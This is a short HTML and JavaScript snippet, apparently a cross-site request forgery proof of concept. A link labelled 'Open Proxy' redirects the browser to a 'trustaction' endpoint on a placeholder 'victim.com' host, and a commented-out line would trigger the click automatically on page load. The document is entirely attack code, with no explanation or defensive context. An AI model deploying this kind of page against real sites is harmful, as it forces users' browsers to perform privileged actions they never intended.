<a id="some" onclick="some()" target="_blank" href="proxy.aspx">Open Proxy</a>
<script>

//window.onload=document.getElementById('some').click();

function some(){
	window.location.href="http://victim.com:5050/trustaction/";
}

</script>